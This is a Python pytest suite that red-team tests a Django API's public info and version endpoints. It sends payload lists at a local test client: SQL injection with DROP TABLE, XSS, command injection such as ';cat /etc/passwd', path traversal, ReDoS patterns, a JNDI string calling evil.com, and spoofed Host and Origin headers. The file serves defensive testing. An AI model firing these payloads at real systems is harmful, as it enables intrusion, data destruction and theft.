"""T281: Public endpoints redteam security tests.

Red Team security tests for public endpoints (/api/v2/info, /api/v2/version).
Tests for information disclosure, injection, and DoS vulnerabilities.
Uses SecLists for comprehensive fuzzing.
"""

import time

import pytest
from rest_framework.test import APIClient


# =============================================================================
# SecLists Payloads
# =============================================================================

NAUGHTY_STRINGS = [
    "",  # Empty
    "null", "NULL", "undefined", "None",
    "${jndi:ldap://evil.com}",
    "__proto__", "constructor",
    "<script>alert(1)</script>",
    "' OR '1'='1",
    "'; DROP TABLE--",
    "../", "..\\",
    "/etc/passwd",
    "C:\\Windows\\System32",
    "🎧🎤🎵",  # Emoji
    "\x00", "\xff",
    "${7*7}",  # SSTI
    "{{7*7}}",
]

PATH_TRAVERSAL = [
    "../etc/passwd",
    "..\\windows\\system32\\config\\sam",
    "....//....//etc/passwd",
    "..%2f..%2fetc/passwd",
    "%2e%2e%2fetc%2fpasswd",
    "/etc/passwd%00",
    "C:\\boot.ini",
]

COMMAND_INJECTION = [
    ";id",
    "|whoami",
    "`id`",
    "$(id)",
    ";cat /etc/passwd",
]

# ReDoS patterns
REDOS_PATTERNS = [
    "a" + "!" * 100 + "X",
    "(a+)+",
    "([a-zA-Z]+)*",
    "(a|aa)+",
]


# =============================================================================
# API8:2023 Information Disclosure
# =============================================================================

@pytest.mark.django_db
class TestPublicEndpointsRedTeamInfoDisclosure:
    """Information disclosure tests for public endpoints."""

    def test_info_endpoint_discloses_too_much(self):
        """
        Info endpoint may disclose sensitive configuration.
        """
        client = APIClient()
        response = client.get("/api/v2/info")

        assert response.status_code == 200
        data = response.json()

        # Check for potentially sensitive fields
        sensitive_fields = [
            "database", "db_host", "db_name", "db_user",
            "secret_key", "api_key", "password",
            "internal_ip", "server_software",
            "django_version", "python_version",
        ]

        found_sensitive = [f for f in sensitive_fields if f in data]
        if found_sensitive:
            pytest.xfail(f"T760: Info endpoint discloses sensitive fields: {found_sensitive}")

    def test_version_endpoint_discloses_stack_info(self):
        """
        Version endpoint may disclose detailed stack information.
        """
        client = APIClient()
        response = client.get("/api/v2/version")

        assert response.status_code == 200
        data = response.json()

        # Check for information that aids reconnaissance
        recon_fields = [
            "django_version",
            "drf_version",
            "python_version",
            "postgresql_version",
            "installed_apps",
            "middleware",
        ]

        found_recon = [f for f in recon_fields if f in data]
        if len(found_recon) > 2:
            pytest.xfail(f"T761: Version endpoint discloses stack info: {found_recon}")

    def test_error_messages_disclose_structure(self):
        """
        Error responses from public endpoints may leak structure.
        """
        client = APIClient()

        # Trigger errors with malformed input
        response = client.get("/api/v2/info?format=invalid")

        if response.status_code == 500:
            error_text = str(response.content).lower()
            leak_keywords = ["traceback", "file \"", "line ", "column", "sql"]
            if any(kw in error_text for kw in leak_keywords):
                pytest.xfail("T762: Error message leaks application structure")

    def test_options_method_discloses_endpoints(self):
        """
        OPTIONS request may disclose available methods/fields.
        """
        client = APIClient()
        response = client.options("/api/v2/info")

        if response.status_code == 200:
            data = response.json()
            # OPTIONS may reveal serializer fields
            if "actions" in data and "POST" in data.get("actions", {}):
                pytest.xfail("T763: OPTIONS reveals write operations on public endpoint")


# =============================================================================
# API8:2023 Injection Attacks
# =============================================================================

@pytest.mark.django_db
class TestPublicEndpointsRedTeamInjection:
    """Injection tests for public endpoints."""

    def test_sqli_in_query_params(self):
        """
        SQL Injection via query parameters on public endpoints.
        """
        client = APIClient()

        sqli_payloads = [
            "' OR '1'='1",
            "'; DROP TABLE info--",
            "' UNION SELECT * FROM auth_user--",
        ]

        for payload in sqli_payloads:
            response = client.get(f"/api/v2/info?test={payload}")

            if response.status_code == 500:
                error_text = str(response.content).lower()
                if "sql" in error_text or "syntax" in error_text:
                    pytest.xfail(f"T764: SQLi in public endpoint query params: {payload[:30]}")

    def test_xss_via_reflected_params(self):
        """
        Reflected XSS via query parameters.
        """
        client = APIClient()

        xss_payloads = [
            "<script>alert(1)</script>",
            "<img src=x onerror=alert(1)>",
            "<svg onload=alert(1)>",
        ]

        for payload in xss_payloads:
            response = client.get(f"/api/v2/info?callback={payload}")

            # Check if payload is reflected without sanitization
            if payload in str(response.content):
                pytest.xfail(f"T765: Reflected XSS in public endpoint: {payload[:30]}")

    def test_command_injection_via_params(self):
        """
        Command injection via query parameters.
        """
        client = APIClient()

        for payload in COMMAND_INJECTION[:3]:
            response = client.get(f"/api/v2/version?debug={payload}")

            if response.status_code == 500:
                error_text = str(response.content).lower()
                if "uid=" in error_text or "root:" in error_text:
                    pytest.xfail(f"T766: Command injection in public endpoint: {payload}")

    def test_path_traversal_in_params(self):
        """
        Path traversal via query parameters.
        """
        client = APIClient()

        for payload in PATH_TRAVERSAL[:3]:
            response = client.get(f"/api/v2/info?file={payload}")

            if response.status_code == 200:
                content = str(response.content)
                if "root:" in content or "passwd" in content:
                    pytest.xfail(f"T767: Path traversal in public endpoint: {payload}")


# =============================================================================
# API4:2023 Resource Consumption (DoS)
# =============================================================================

@pytest.mark.django_db
class TestPublicEndpointsRedTeamDoS:
    """Denial of Service tests for public endpoints."""

    def test_redos_via_query_params(self):
        """
        ReDoS via regex patterns in query parameters.
        """
        client = APIClient()

        for pattern in REDOS_PATTERNS[:2]:
            start = time.time()
            response = client.get(f"/api/v2/info?search={pattern}")
            duration = time.time() - start

            if duration > 2:  # Should complete quickly
                pytest.xfail(f"T768: ReDoS in public endpoint: {duration:.2f}s")

    def test_rapid_requests_no_rate_limit(self):
        """
        Rapid requests to public endpoints should be rate limited.
        """
        client = APIClient()

        start = time.time()
        for _ in range(100):
            response = client.get("/api/v2/info")
            assert response.status_code == 200
        elapsed = time.time() - start

        if elapsed < 5:  # 100 requests in under 5 seconds
            pytest.xfail(f"T769: No rate limiting on public endpoints (100 req in {elapsed:.2f}s)")

    def test_large_response_size(self):
        """
        Public endpoints should not return excessively large responses.
        """
        client = APIClient()
        response = client.get("/api/v2/info")

        content_length = len(response.content)
        if content_length > 10000:  # 10KB threshold
            pytest.xfail(f"T770: Public endpoint returns large response ({content_length} bytes)")


# =============================================================================
# API8:2023 Security Misconfiguration - Fuzzing
# =============================================================================

@pytest.mark.django_db
class TestPublicEndpointsRedTeamFuzzing:
    """Fuzzing tests for public endpoints."""

    def test_fuzz_query_params(self):
        """
        Fuzz query parameters with naughty strings.
        """
        client = APIClient()

        for payload in NAUGHTY_STRINGS[:10]:
            response = client.get(f"/api/v2/info?test={payload}")

            if response.status_code == 500:
                pytest.xfail(f"T771: Fuzz param causes 500: {payload[:20]}")

    def test_fuzz_accept_header(self):
        """
        Fuzz Accept header with malformed values.
        """
        client = APIClient()

        malformed_accepts = [
            "application/;",
            "*/",
            "<script>",
            "application/json,",
            "text/html;q=999",
        ]

        for accept in malformed_accepts:
            response = client.get(
                "/api/v2/info",
                HTTP_ACCEPT=accept
            )

            if response.status_code == 500:
                pytest.xfail(f"T772: Malformed Accept header causes 500: {accept}")

    def test_fuzz_content_type(self):
        """
        Fuzz Content-Type header on GET (should be ignored but test anyway).
        """
        client = APIClient()

        weird_content_types = [
            "application/",
            "text/",
            "<script>",
            "application/json; charset=",
        ]

        for ct in weird_content_types:
            response = client.get(
                "/api/v2/version",
                HTTP_CONTENT_TYPE=ct
            )

            if response.status_code == 500:
                pytest.xfail(f"T773: Weird Content-Type causes 500: {ct}")


# =============================================================================
# HTTP Method Tests
# =============================================================================

@pytest.mark.django_db
class TestPublicEndpointsRedTeamMethods:
    """HTTP method tests for public endpoints."""

    def test_post_on_read_only_endpoint(self):
        """
        POST on read-only public endpoint should fail gracefully.
        """
        client = APIClient()
        response = client.post("/api/v2/info", {})

        # Should be 405 (Method Not Allowed) not 500
        if response.status_code == 500:
            pytest.xfail("T774: POST on public endpoint causes 500")

        assert response.status_code in [405, 403, 404]

    def test_put_on_read_only_endpoint(self):
        """
        PUT on read-only public endpoint should fail gracefully.
        """
        client = APIClient()
        response = client.put("/api/v2/version", {})

        if response.status_code == 500:
            pytest.xfail("T775: PUT on public endpoint causes 500")

        assert response.status_code in [405, 403, 404]

    def test_delete_on_read_only_endpoint(self):
        """
        DELETE on read-only public endpoint should fail gracefully.
        """
        client = APIClient()
        response = client.delete("/api/v2/info")

        if response.status_code == 500:
            pytest.xfail("T776: DELETE on public endpoint causes 500")

        assert response.status_code in [405, 403, 404]

    def test_trace_method_disabled(self):
        """
        TRACE method should be disabled on public endpoints.
        """
        client = APIClient()
        response = client.trace("/api/v2/info")

        assert response.status_code in [405, 403]


# =============================================================================
# Cache Poisoning Tests
# =============================================================================

@pytest.mark.django_db
class TestPublicEndpointsRedTeamCachePoisoning:
    """Cache poisoning tests."""

    def test_cache_poisoning_via_host_header(self):
        """
        Host header poisoning on public endpoints.
        """
        client = APIClient()

        # Request with poisoned Host header
        response1 = client.get(
            "/api/v2/info",
            HTTP_HOST="evil.com",
            HTTP_X_FORWARDED_HOST="evil.com"
        )

        # Normal request
        response2 = client.get("/api/v2/info")

        # If second response reflects poisoned host, cache poisoning works
        if "evil.com" in str(response2.content):
            pytest.xfail("T777: Cache poisoning via Host header on public endpoint")

    def test_cache_poisoning_via_query_param(self):
        """
        Cache poisoning via query parameter.
        """
        client = APIClient()

        # Request with unique param
        response1 = client.get("/api/v2/info?unique=xyz123")

        # Request without param should be same (if no cache poisoning)
        response2 = client.get("/api/v2/info")

        # This test is mostly documentation
        pass


# =============================================================================
# CORS Tests
# =============================================================================

@pytest.mark.django_db
class TestPublicEndpointsRedTeamCORS:
    """CORS configuration tests."""

    def test_cors_preflight_public_endpoint(self):
        """
        CORS preflight on public endpoints.
        """
        client = APIClient()

        response = client.options(
            "/api/v2/info",
            HTTP_ORIGIN="https://evil.com",
            HTTP_ACCESS_CONTROL_REQUEST_METHOD="GET"
        )

        if response.status_code == 200:
            allow_origin = response.get("Access-Control-Allow-Origin")
            if allow_origin == "*" or allow_origin == "https://evil.com":
                pytest.xfail("T778: CORS allows arbitrary origin on public endpoint")

    def test_cors_credentials_on_public_endpoint(self):
        """
        CORS credentials header on public endpoint.
        """
        client = APIClient()

        response = client.options(
            "/api/v2/info",
            HTTP_ORIGIN="https://evil.com",
            HTTP_ACCESS_CONTROL_REQUEST_METHOD="GET"
        )

        allow_credentials = response.get("Access-Control-Allow-Credentials")
        if allow_credentials == "true":
            # With wildcard or reflected origin, this is dangerous
            allow_origin = response.get("Access-Control-Allow-Origin")
            if allow_origin in ["*", "https://evil.com"]:
                pytest.xfail("T779: CORS credentials with open origin on public endpoint")
